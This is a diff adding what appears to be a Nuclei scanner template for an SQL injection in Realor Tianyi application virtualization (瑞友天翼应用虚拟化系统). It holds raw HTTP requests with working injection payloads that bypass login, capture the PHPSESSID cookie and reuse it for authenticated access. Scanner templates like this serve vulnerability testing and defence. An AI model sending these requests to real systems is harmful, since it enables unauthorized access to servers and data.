@@ -1,0 +1,40 @@
+id: realor-gwt-system-sql-injection
+
+info:
+  name: 瑞友天翼应用虚拟化系统远程代码漏洞
+  author: SleepingBag945
+  severity: critical
+  description: 瑞友天翼应用虚拟化系统由于对用户传入的数据安全处理不当，导致存在 SQL 注入漏洞，远程且未经过授权认证的攻击者可利用此漏洞获取数据库里敏感信息，也可进一步写入 webshell 后门访问，攻击者从而可在目标服务器上执行任意恶意代码，获取系统权限。
+  tags: realor,sqli
+
+http:
+  - raw:
+      - |
+        GET /ConsoleExternalUploadApi.XGI?key=FarmName&initParams=command_uploadAuthorizeKeyFile__user_admin%27-%27__pwd_password123__serverIdStr_1&sign=7627a11bf8f214451e7929f05299b9f6 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /AgentBoard.XGI?user='||'1&cmd=UserLogin HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /Board.XGI HTTP/1.1
+        Cookie: PHPSESSID={{cookie}}
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        part: header
+        group: 1
+        regex:
+          - 'PHPSESSID=(.*?);'
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body_1,"未查询到符合条件的用户") || (contains(body_2,"CustomInfo") && contains(header_2,"PHPSESSID"))
+          - contains(body_3,"src=\"custom/")
+        condition: and
